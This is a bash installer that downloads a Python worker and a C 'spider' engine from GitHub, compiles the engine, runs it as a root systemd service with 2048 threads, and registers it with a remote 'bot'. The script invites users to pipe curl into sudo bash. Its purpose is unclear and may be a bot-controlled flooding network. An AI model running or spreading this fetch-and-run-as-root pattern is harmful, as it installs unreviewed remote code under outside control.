#!/usr/bin/env bash
# One-command worker install for any Ubuntu/Debian box (x86_64 or aarch64).
#
#   curl -fsSL https://raw.githubusercontent.com/<owner>/<repo>/main/vps/install.sh | sudo bash
#
# It compiles the engine for THIS machine's architecture, installs the worker
# API, starts it under systemd, and prints the URL to give the bot.
set -euo pipefail

REPO="${WORKER_REPO:-amitsinghkhakhal-star/magneto-38094c6e4014}"
BRANCH="${WORKER_BRANCH:-main}"
PORT="${WORKER_PORT:-8080}"
SECRET="${WORKER_SECRET:-$(head -c 24 /dev/urandom | base64 | tr -d '/+=' | head -c 32)}"
DIR=/opt/worker

raw="https://raw.githubusercontent.com/${REPO}/${BRANCH}"

echo "==> architecture: $(uname -m)"
echo "==> fetching sources from ${REPO}"

if ! command -v gcc >/dev/null 2>&1 || ! command -v python3 >/dev/null 2>&1; then
    apt-get update -qq
    apt-get install -y -qq gcc libc6-dev python3 curl ca-certificates
fi

mkdir -p "$DIR"

curl -fsSL "$raw/worker.py" -o "$DIR/worker.py"
curl -fsSL "$raw/engine/spider.c" -o "$DIR/spider.c" 2>/dev/null || \
    curl -fsSL "$raw/spider.c" -o "$DIR/spider.c"

echo "==> compiling engine"
gcc -O3 -pthread -o "$DIR/spider" "$DIR/spider.c"
chmod +x "$DIR/spider"
"$DIR/spider" 2>&1 | head -2 || true

echo "==> installing service"
cat > /etc/systemd/system/worker.service <<UNIT
[Unit]
Description=worker
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment=PORT=${PORT}
Environment=WORKER_SECRET=${SECRET}
Environment=SPIDER_BINARY=${DIR}/spider
Environment=THREADS=2048
Environment=SPIDER_MODE=vc
ExecStart=/usr/bin/python3 -u ${DIR}/worker.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now worker
sleep 3

IP=$(curl -fsSL -m 5 https://api.ipify.org || hostname -I | awk '{print $1}')

echo
echo "=================================================="
echo " worker is live"
echo "   url    : http://${IP}:${PORT}"
echo "   secret : ${SECRET}"
echo
echo " open the port in your provider firewall:"
echo "   ufw allow ${PORT}/tcp    (if ufw is active)"
echo
echo " add it to the bot with:"
echo "   🛰 ᴡᴏʀᴋᴇʀs → ➕ ᴀᴅᴅ ᴡᴏʀᴋᴇʀ → http://${IP}:${PORT}|${SECRET}"
echo "=================================================="
